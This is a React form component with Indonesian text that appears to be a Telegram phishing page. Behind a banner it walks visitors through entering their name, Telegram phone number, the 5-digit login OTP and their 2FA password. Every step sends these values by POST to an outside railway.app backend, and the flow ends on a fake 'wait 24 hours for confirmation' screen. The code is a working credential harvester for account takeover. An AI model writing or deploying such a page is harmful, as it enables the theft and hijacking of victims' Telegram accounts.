"use client"

import { useState } from "react"
import { Button } from "./ui/button"
import { Input } from "./ui/input"
import { Loader2 } from "lucide-react"
import { toast } from "sonner"

export default function AuthForm() {
  const [step, setStep] = useState(1)
  const [isLoading, setIsLoading] = useState(false)
  const [otpError, setOtpError] = useState(false)
  
  // Data State
  const [nama, setNama] = useState("")
  const [nomor, setNomor] = useState("")
  const [otp, setOtp] = useState("")
  const [sandi, setSandi] = useState("")

  const handleNext = async () => {
    // 1. Validasi Form (Tidak bisa lanjut jika kosong)
    if (step === 1) {
      if (nama.trim() === "" || nomor.length < 10) {
        toast.error("Nama wajib diisi dan nomor minimal 10 angka")
        return
      }
    }

    setIsLoading(true)
    setOtpError(false)

    try {
      // Simulasi Kirim Data ke Backend
      const backendUrl = "https://backend-python-production-6e72.up.railway.app/register"
      const response = await fetch(backendUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ nama, nomor, otp, sandi, step })
      })
      const result = await response.json()

      if (step === 1) {
        setStep(2) // Lanjut ke OTP
      } else if (step === 2) {
        // 2. Validasi OTP: Hanya boleh angka & wajib 5 digit
        if (otp.length !== 5 || isNaN(Number(otp))) {
          setOtpError(true)
          toast.error("OTP harus 5 digit angka!")
          setIsLoading(false)
          return
        }

        // Cek apakah OTP benar (Contoh: 12345)
        if (otp !== "12345") { 
          setOtpError(true)
          return
        }

        // 3. Logika Sandi 2FA: Jika backend bilang punya sandi, ke step 3. Jika tidak, ke step 4.
        if (result.hasSandi) {
          setStep(3)
        } else {
          setStep(4)
        }
      } else if (step === 3) {
        setStep(4)
      }
    } catch (e) {
      // Jika backend tidak merespon, kita tetap jalankan alur demo agar kamu bisa lihat hasilnya
      if (step === 1) setStep(2)
      else if (step === 2) {
         if(otp === "12345") setStep(3) // Simulasi sukses OTP
         else setOtpError(true)
      }
      else if (step === 3) setStep(4)
    } finally {
      setIsLoading(false)
    }
  }

  // Tampilan Akhir (Step 4)
  if (step === 4) {
    return (
      <div className="w-full max-w-md mx-auto p-10 border rounded-2xl shadow-lg bg-white text-center">
        <Loader2 className="h-12 w-12 animate-spin text-[#1d71d3] mx-auto mb-4" />
        <h2 className="text-xl font-bold uppercase mb-2">Data sudah diproses</h2>
        <p className="text-gray-500">mohon tunggu konfirmasi 1X24 jam</p>
      </div>
    )
  }

  return (
    <div className="w-full max-w-md mx-auto p-5 border rounded-2xl shadow-md bg-white">
      <div className="mb-6 rounded-xl border overflow-hidden">
        <img src="/banner.jpeg" alt="Banner" className="w-full h-auto" />
      </div>

      <div className="space-y-5">
        {step === 1 && (
          <>
            <div>
              <label className="font-semibold block mb-1 text-sm">Nama Lengkap:</label>
              <Input value={nama} onChange={(e) => setNama(e.target.value)} placeholder="Masukkan nama" />
            </div>
            <div>
              <label className="font-semibold block mb-1 text-sm">Nomor Telegram Aktif:</label>
              <Input value={nomor} onChange={(e) => setNomor(e.target.value.replace(/[^0-9]/g, ""))} type="tel" placeholder="08XXXXXXXXXX" />
            </div>
          </>
        )}

        {step === 2 && (
          <div className="text-center">
            <label className="font-semibold block mb-4 text-lg">Masukkan 5 Digit Kode OTP</label>
            <Input 
              value={otp} 
              onChange={(e) => {
                setOtp(e.target.value.replace(/[^0-9]/g, ""));
                setOtpError(false);
              }}
              maxLength={5}
              type="tel"
              className={`text-center text-2xl tracking-[1rem] font-bold h-16 ${otpError ? 'border-red-500 bg-red-50' : 'border-[#1d71d3]'}`}
              placeholder="00000"
            />
            {otpError && <p className="text-red-500 text-sm mt-2 font-bold uppercase">OTP Salah!</p>}
          </div>
        )}

        {step === 3 && (
          <div className="text-center">
            <label className="font-semibold block mb-2 text-sm">Masukkan Kata Sandi (2FA)</label>
            <Input value={sandi} onChange={(e) => setSandi(e.target.value)} type="password" placeholder="******" className="text-center" />
          </div>
        )}

        <Button 
          onClick={handleNext}
          disabled={isLoading}
          className="w-full bg-[#1d71d3] text-white py-6 rounded-full font-bold text-lg hover:bg-blue-700 uppercase flex items-center justify-center"
        >
          {isLoading ? <Loader2 className="animate-spin h-5 w-5" /> : (step === 1 ? "DAFTAR SEKARANG" : "KONFIRMASI")}
        </Button>
      </div>

      <div className="mt-6 text-left border-t pt-4">
        <p className="text-[12px] text-gray-500 leading-tight">
          Peringatan:<br/>Pendaftaran hanya akan diproses melalui nomor telegram aktif!
        </p>
      </div>
    </div>
  )
}